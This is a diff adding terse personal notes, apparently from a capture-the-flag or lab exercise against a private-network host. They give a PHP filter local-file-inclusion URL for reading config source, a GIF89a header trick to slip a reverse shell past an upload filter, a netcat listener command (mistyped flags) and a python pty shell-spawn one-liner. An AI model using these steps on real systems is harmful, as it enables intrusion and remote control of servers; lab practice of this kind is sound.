@@ -1,0 +1,16 @@
+http://192.168.56.111/?page=php://filter/convert.base64-encode/resource=config
+
+include GIF header to bypass reverse shell upload
+
+at to top of the file --> GIF89a
+change IP --> IP should be the IP of the Hacking Machine
+
+check the upload directory (copy the filename)
+
+Now after uploading the reverse shell start a nc 
+
+nc -nvlpn 1234 {port number}
+
+spawn a shell using python
+---------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
